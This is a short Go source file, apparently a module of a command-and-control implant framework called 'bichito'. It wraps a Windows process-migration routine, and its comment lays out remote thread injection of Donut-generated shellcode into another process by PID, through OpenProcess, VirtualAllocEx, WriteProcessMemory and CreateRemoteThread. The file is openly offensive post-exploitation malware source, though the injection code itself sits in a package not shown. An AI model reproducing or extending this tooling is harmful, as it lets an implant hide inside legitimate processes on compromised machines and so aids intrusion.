// +build windows

package biterpreter

import (
    "bichito/modules/biterpreter/migrate_remote_thread_windows"
)

/*
Description: Migrate:Remote thread injection --> Windows. Inject a donut generated binary shellcode in the memory of another process and create a new thread.
Flow:
A. Will select the x64/x32 version of "migrate_remote_thread_windows" package
B. Decode JSON object, that includes shellcode and PID
C. Prepare C pointers, and call Migrate C++ wrapper
D. C++:
    d1. OpenProcess
    d2. VirtualAllocEx
    d3. WriteProcessMemory
    d4. CreateRemoteThread

E. C++ will return error/success. Error will be from the first windows api error (like cannot access target PID)

*/
func Migrate(jsonMigrate string) (bool,string){

    err,result := migrate_remote_thread_windows.Migrate(jsonMigrate)
    if err != false {
        return true,result
    }

    return false,result
}